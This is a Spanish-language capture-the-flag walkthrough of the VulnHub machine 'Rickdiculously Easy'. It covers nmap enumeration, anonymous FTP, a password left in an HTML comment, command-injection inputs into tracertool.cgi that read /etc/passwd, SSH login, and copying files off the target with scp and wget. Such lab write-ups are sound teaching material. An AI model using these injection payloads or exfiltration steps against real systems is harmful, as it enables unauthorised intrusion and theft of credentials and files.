# Rickdiculously Easy (VulnHub) en VMware – WriteUp completo (hasta acceso SSH + extracción de credenciales)

> **Aviso (ético y legal):** Solo para laboratorio/CTF y aprendizaje. No usar contra sistemas reales sin permiso.

---

## Índice

1. Arranque de la VM y contexto inicial  
2. Descubrimiento de IP (netdiscover + ifconfig)  
3. Red aislada en VMware (por qué se hace)  
4. Enumeración con Nmap (lab) + metodología real en fases  
5. FTP anónimo (flag)  
6. Web (80): dirsearch + `/passwords/` + `robots.txt`  
7. `tracertool.cgi`: Command Injection + enumeración de usuarios  
8. Cockpit/HTTP 9090 (qué es, por qué importa, por qué ir por navegador)  
9. Puertos “raros”: 13337 / 60000 (cómo interpretar `unknown`)  
10. SSH alternativo 22222 (por qué es clave)  
11. Acceso SSH como `Summer` + post-explotación mínima  
12. Exfiltración de archivos (scp / python http.server / wget)  
13. Análisis de imagen (exiftool + strings) → password del ZIP  

---

## 1. Arranque de la VM y consola inicial

Una vez iniciada la máquina víctima en VMware, vemos el login local en consola.

📷 **Imagen 1 — Consola inicial**
![Consola Fedora / login](images/01-vm-boot-login.png)

La propia consola muestra una pista importante: un panel de administración en `https://127.0.0.1:9090/`.  
En Fedora/RHEL esto suele ser **Cockpit** (más adelante veremos por qué es relevante).

---

## 2. Descubrimiento de IP (no tenemos info)

### 2.1 Netdiscover (reconocimiento ARP)

En Kali:

```bash
sudo netdiscover
```

**Qué hace y por qué se usa**
- `netdiscover` realiza reconocimiento por **ARP**.
- ARP solo funciona en **red local**, así que es perfecto cuando tienes Kali y la víctima en la misma red virtual.
- Te permite ver IPs activas + MAC + fabricante (VMware, etc.)

**Por qué `sudo`**
- Necesita privilegios para capturar/enviar ARP (raw sockets).

📷 **Imagen 2 — netdiscover + ifconfig**
![netdiscover + ifconfig](images/02-netdiscover-ifconfig.png)

---

## 3. Calcular rango con ifconfig

```bash
ifconfig
```

Ejemplo:

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.184.128  netmask 255.255.255.0  broadcast 192.168.184.255
```

**Qué significa**
- `inet`: tu IP
- `netmask 255.255.255.0` = `/24`
- Por tanto, tu rango sería `192.168.184.0/24`

---

## 4. Red aislada VMware (por qué se hace)

Para que ambas máquinas se vean, se creó una red virtual nueva en VMware:

- `192.168.247.0/24`

Esto se hace en auditorías/labs porque:
- facilita ARP (netdiscover)
- evita mezclar con redes reales
- simplifica el troubleshooting

En ese rango:
- Kali: `192.168.247.129`
- Víctima (probable): `192.168.247.128`

Escaneo ARP dirigido:

```bash
sudo netdiscover -r 192.168.247.0/24
```

- `-r`: fuerza el rango a escanear (más rápido y preciso).

---

## 5. Confirmación del objetivo con Nmap (modo laboratorio)

```bash
nmap -p- -sCV -n -Pn -vvv --open -T5 -oN Rickdiculously 192.168.247.128
```

### 5.1 Flags (explicación extendida)

- `-p-`: escanea **1–65535** (todos los puertos TCP).  
  En CTFs es clave porque esconden servicios en puertos altos (ej. 13337/22222/60000).

- `-sC`: scripts NSE “por defecto”.  
  Ventaja: detecta cosas útiles automáticamente (ej. `ftp-anon`).  
  Desventaja: más ruido (más peticiones).

- `-sV`: identifica **versiones** y banners.

- `-n`: sin DNS.

- `-Pn`: asume host UP.

- `-vvv`: salida muy verbosa.

- `--open`: solo puertos open.

- `-T5`: timing agresivo.

- `-oN`: guarda la salida.

---

## 6. Metodología realista: Nmap en fases (por qué es mejor)

### Fase 1: descubrir puertos “sigiloso”

```bash
nmap 192.168.247.128 -sS -T0
```

- `-sS`: SYN scan.
- `-T0`: timing más lento.

### Fase 2: enumeración dirigida

```bash
nmap 192.168.247.128 -p21,22,80,9090,13337,22222,60000 -sCV
```

---

## 7. FTP anónimo (21/tcp)

```bash
ftp -a 192.168.247.128
```

- `-a`: login anónimo automático.

Dentro:

```text
ftp> ls
ftp> get FLAG.txt
```

```bash
cat FLAG.txt
```

---

## 8. Web en 80/tcp: enumeración con dirsearch

```bash
dirsearch -u http://192.168.247.128
```

Hallazgos:
- `/passwords/` (200)
- `/robots.txt` (200)
- `/cgi-bin/` (403)

---

## 9. `/passwords/` (directory listing) + password

📷 **Imagen 3 — Index of /passwords**
![Index /passwords](images/03-web-passwords-index.png)

En `passwords.html`:

```html
<!--Password: winter-->
```

---

## 10. `robots.txt` como “mapa”

Incluye:
- `/cgi-bin/tracertool.cgi`

---

## 11. `tracertool.cgi` → Command Injection

📷 **Imagen 4 — tracertool.cgi**
![Formulario tracertool](images/04-tracertool-form.png)

Input de prueba:

```
192.168.247.128; whoami; pwd
```

### 11.1 Output raro al leer /etc/passwd (Imagen 5)

📷 **Imagen 5 — Salida alterada**
![Salida alterada](images/05-tracertool-output-art.png)

Bypass con salida corta:

```
; tail -n 30 /etc/passwd
```

---

## 12. Cockpit en 9090: por qué pasamos a ese puerto y por qué en navegador

Del Nmap apareció:

```text
9090/tcp  open  http    Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.247.128:9090/
| http-methods: 
|_  Supported Methods: GET HEAD
```

### 12.1 Qué significa “open http Cockpit web service”

- **Puerto 9090 abierto**: el servicio está accesible desde tu Kali.
- **Servicio HTTP**: responde como servicio web.
- **Cockpit**: Nmap identifica que es Cockpit (panel admin típico en Fedora/RHEL).

**Por qué es importante**
- Un panel admin expuesto es un objetivo prioritario:
  - puede filtrar información
  - puede permitir login con usuarios del sistema
  - puede tener fallos o configuraciones débiles
- En CTF muchas veces contiene flags o pistas (como aquí).

### 12.2 “Did not follow redirect to https://…” (lo crítico)

Cockpit suele forzar **HTTPS**.

Nmap intentó leer título por HTTP y recibió un **redirect** a HTTPS.  
Por eso te dice la URL correcta:

- `https://192.168.247.128:9090/`

**Conclusión práctica**: lo abres en navegador con `https://` (no `http://`).

### 12.3 `Supported Methods: GET HEAD`

El script `http-methods` detecta métodos permitidos:
- `GET`: petición normal
- `HEAD`: como GET, pero sin cuerpo

En una auditoría real esto se usa para ver si hay métodos peligrosos (`PUT/DELETE/TRACE`).  
Aquí no los hay, pero confirma que el servicio es web “normal”.

### 12.4 Por qué en navegador

Porque es un panel web real (Cockpit):
- la interacción es visual
- puedes ver login/pistas
- puedes identificar contenido rápidamente

📷 **Imagen 6 — Cockpit**
![Cockpit 9090 flag](images/06-cockpit-9090-flag.png)

---

## 13. Puertos extra: qué significan 22222 / 13337 / 60000

### 13.1 22222/tcp open ssh OpenSSH 7.5 (protocol 2.0)

- Hay un SSH real en **puerto no estándar**.
- En CTF es típico que el 22 sea bait y el SSH real esté en otro puerto.

Por eso probamos:

```bash
ssh Summer@192.168.247.128 -p 22222
```

### 13.2 13337/tcp open unknown

- `unknown` significa: Nmap no reconoce el servicio (no que esté cerrado).
- En CTF, 13337 suele ser backdoor o “flag server”.

Se enumera con:

```bash
nmap 192.168.247.128 -p13337 -sCV
```

o incluso con `nc`.

### 13.3 60000/tcp open unknown

- Igual: servicio no reconocido.
- Pero devuelve banner: “half baked reverse shell…”
- Normalmente se probaría con `nc` para ver interacción.

---

## 14. Enumeración dirigida (menos ruido)

```bash
nmap 192.168.247.128 -p13337,22222,60000 -sCV
```

---

## 15. SSH real (22222)

```bash
ssh Summer@192.168.247.128 -p 22222
```

Password: `winter`

---

## 16. `sudo -l`

```bash
sudo -l
```

---

## 17. Exfiltración (scp / http.server / wget)

```bash
scp -P 22222 Summer@192.168.247.128:/home/Morty/journal.txt.zip ./
scp -P 22222 Summer@192.168.247.128:/home/Morty/Safe_Password.jpg ./
```

Servidor:

```bash
python3 -m http.server 8080
```

Descarga:

```bash
wget http://192.168.247.128:8080/Safe_Password.jpg
```

---

## 18. Análisis del JPG

```bash
exiftool Safe_Password.jpg
strings Safe_Password.jpg
```

